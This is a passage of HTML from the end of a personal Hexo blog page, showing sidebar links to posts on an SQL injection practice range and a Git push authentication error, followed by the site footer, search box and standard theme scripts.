class="content"><a class="title" href="/2022/10/15/%E7%94%9F%E5%91%BD%E5%9C%A8%E4%BA%8E%E6%8A%98%E8%85%BE%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AE%9E%E6%93%8D%EF%BC%88%E5%85%AD%EF%BC%89less26-30/" title="SQL注入靶场（六）">SQL注入靶场（六）</a><time datetime="2022-10-14T16:00:00.000Z" title="发表于 2022-10-15 00:00:00">2022-10-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/13/git%E6%8E%A8%E9%80%81%E6%9C%AC%E5%9C%B0%E5%88%B0%E5%BA%93%E9%89%B4%E6%9D%83%E5%A4%B1%E8%B4%A5/" title="Git推送本地到库鉴权失败"><img src="/img/git_img.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Git推送本地到库鉴权失败"/></a><div class="content"><a class="title" href="/2022/10/13/git%E6%8E%A8%E9%80%81%E6%9C%AC%E5%9C%B0%E5%88%B0%E5%BA%93%E9%89%B4%E6%9D%83%E5%A4%B1%E8%B4%A5/" title="Git推送本地到库鉴权失败">Git推送本地到库鉴权失败</a><time datetime="2022-10-12T16:00:00.000Z" title="发表于 2022-10-13 00:00:00">2022-10-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/sqlbachang.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Maxenton</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script src="/js/custom/custom.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
